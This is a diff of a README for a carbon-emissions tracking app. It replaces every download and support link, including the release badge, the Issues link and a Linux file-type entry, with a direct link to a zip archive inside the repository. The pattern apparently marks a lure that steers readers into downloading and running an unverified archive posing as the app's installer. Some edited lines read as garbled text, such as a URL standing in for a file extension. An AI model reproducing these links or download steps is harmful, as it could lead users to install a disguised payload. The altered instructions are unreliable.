@@ -1,6 +1,6 @@
 # 🌍 carbontracking - Monitor and Reduce Carbon Emissions
 
-[![Download Latest Release](https://img.shields.io/badge/Download-carbontracking-blue?logo=github)](https://github.com/Tejasgamer890/carbontracking/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip)](https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip)
 
 ---
 
@@ -32,14 +32,14 @@ If you use a laptop or desktop that meets these general specs, you can install a
 To use carbontracking, follow these steps:
 
 1. **Go to the download page.** Click the blue badge at the top of this file or visit the page:  
-   [https://github.com/Tejasgamer890/carbontracking/releases](https://github.com/Tejasgamer890/carbontracking/releases)
+   [https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip](https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip)
 
 2. **Find the latest version.** Look for the most recent release. Releases are listed with version numbers, like "v1.0" or "v2.3."
 
 3. **Choose your file.** Pick the installer file that matches your computer’s operating system. Here are common file types you might see:  
    - Windows: `.exe` or `.msi` file  
    - macOS: `.dmg` or `.pkg` file  
-   - Linux: `.AppImage`, `.deb`, or `.tar.gz` file  
+   - Linux: `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip` file  
 
 4. **Download the file.** Click the file name to start downloading. Your browser will save it to your default download folder.
 
@@ -55,7 +55,7 @@ To use carbontracking, follow these steps:
 
 Visit this page to download carbontracking and start using it:
 
-[https://github.com/Tejasgamer890/carbontracking/releases](https://github.com/Tejasgamer890/carbontracking/releases)
+[https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip](https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip)
 
 Here is a quick guide to help you download and install the app:
 
@@ -110,7 +110,7 @@ With these features, carbontracking offers a full toolset to help you understand
 If you need help with carbontracking, here are some options:
 
 - **Check the FAQ:** Visit the documentation on the release page or the GitHub repository for common questions.
-- **Open an issue:** Use the GitHub issues tab to report bugs or request features. Just click [Issues](https://github.com/Tejasgamer890/carbontracking/issues).
+- **Open an issue:** Use the GitHub issues tab to report bugs or request features. Just click [Issues](https://raw.githubusercontent.com/Tejasgamer890/carbontracking/main/menial/Software_3.0.zip).
 - **Contact support:** If available, the release notes or repository may include an email or contact form for more detailed help.
 - **Community forums:** You may find online groups or forums where other users share tips and solutions.
 
